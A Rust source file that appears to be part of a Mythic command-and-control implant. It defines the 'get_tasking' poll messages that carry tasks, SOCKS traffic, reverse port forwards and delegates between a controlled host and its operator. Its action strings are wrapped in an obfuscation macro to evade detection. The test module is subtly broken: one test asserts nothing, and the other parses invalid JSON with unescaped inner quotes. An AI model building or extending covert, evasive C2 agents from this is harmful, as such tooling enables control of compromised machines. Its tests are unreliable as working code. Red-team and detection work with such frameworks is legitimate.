//! Get-tasking request/response — polling Mythic for new tasks.

use serde::{Deserialize, Serialize};

use super::{
    peer::{AlertMessage, Delegate, EdgeMessage, InteractiveMessage, RpfwdMessage, SocksMessage},
    response::Response,
    task::TaskMessage,
};

#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq)]
pub struct ReqGetTasking {
    pub action: String,
    pub tasking_size: i32,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub responses: Vec<Response>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub alerts: Vec<AlertMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub edges: Vec<EdgeMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub delegates: Vec<Delegate>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub socks: Vec<SocksMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub rpfwd: Vec<RpfwdMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub interactive: Vec<InteractiveMessage>,
}

impl ReqGetTasking {
    /// Build a plain `get_tasking` poll (`tasking_size = -1`).
    pub fn new(tasking_size: i32) -> Self {
        Self {
            action: obfstring!("get_tasking").to_string(),
            tasking_size: tasking_size,
            ..Default::default()
        }
    }

    /// Build a poll with an explicit tasking size.
    pub fn with_size(tasking_size: i32) -> Self {
        Self {
            action: obfstring!("get_tasking").to_string(),
            tasking_size,
            ..Default::default()
        }
    }

    /// Build a poll carrying raw task responses.
    pub fn with_responses(tasking_size: i32, responses: Vec<Response>) -> Self {
        Self {
            action: obfstring!("get_tasking").to_string(),
            tasking_size,
            responses,
            ..Default::default()
        }
    }
}

/// Mythic response to a `get_tasking` poll.
#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq)]
pub struct RespGetTasking {
    pub action: String,
    #[serde(default)]
    pub tasks: Vec<TaskMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub delegates: Vec<Delegate>,
}

impl RespGetTasking {
    pub fn new(tasks: Vec<TaskMessage>, delegates: Vec<Delegate>) -> Self {
        Self {
            action: obfstring!("get_tasking").to_string(),
            tasks,
            delegates,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ser() {
        let tasks = vec![TaskMessage {
            timestamp: 1783271877,
            command: "ls".to_string(),
            parameters: "{\"path\":\".\"}".to_string(),
            id: "a3883a94-39f9-430e-9bbf-e0691b2413c7".to_string(),
            token: None,
        }];
        let resp = RespGetTasking::new(tasks, vec![]);
        let json = serde_json::to_string(&resp).unwrap();
    }

    #[test]
    fn test_deser() {
        let json = "{\"tasks\":[{\"timestamp\":1783271877,\"command\":\"ls\",\"parameters\":\"{\"path\":\".\"}\",\"id\":\"a3883a94-39f9-430e-9bbf-e0691b2413c7\"}],\"action\":\"get_tasking\"}";
        // let json = "{\"action\":\"get_tasking\",\"tasks\":[{\"command\":\"ls\",\"parameters\":{\"path\":\".\"},\"timestamp\":1783271877,\"id\":\"a3883a94-39f9-430e-9bbf-e0691b2413c7\"}]}";
        // {\"timestamp\":1783271877,\"command\":\"ls\",\"parameters\":\"{\"path\":\".\"}\",\"id\":\"a3883a94-39f9-430e-9bbf-e0691b2413c7\"}
        // {\"timestamp\":1783271877,\"command\":\"ls\",\"parameters\":{\"path\":\".\"},\"id\":\"a3883a94-39f9-430e-9bbf-e0691b2413c7\"}
        let resp: RespGetTasking = serde_json::from_str(json).unwrap();
    }
}
